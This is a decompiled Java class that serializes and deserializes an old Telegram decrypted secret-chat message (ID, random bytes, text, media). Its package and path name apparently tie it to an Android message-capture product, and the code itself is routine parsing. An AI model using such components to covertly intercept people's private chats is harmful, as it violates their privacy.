package com.vvt.capture.telegram.internal;

public class TLRPC$TL_decryptedMessage_old
  extends TLRPC.TL_decryptedMessage
{
  public static int constructor = 528568095;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.random_id = l;
    Object localObject = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.random_bytes = ((byte[])localObject);
    localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.message = ((String)localObject);
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    localObject = TLRPC.DecryptedMessageMedia.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.media = ((TLRPC.DecryptedMessageMedia)localObject);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.random_id;
    paramAbstractSerializedData.writeInt64(l);
    Object localObject = this.random_bytes;
    paramAbstractSerializedData.writeByteArray((byte[])localObject);
    localObject = this.message;
    paramAbstractSerializedData.writeString((String)localObject);
    this.media.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessage_old.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */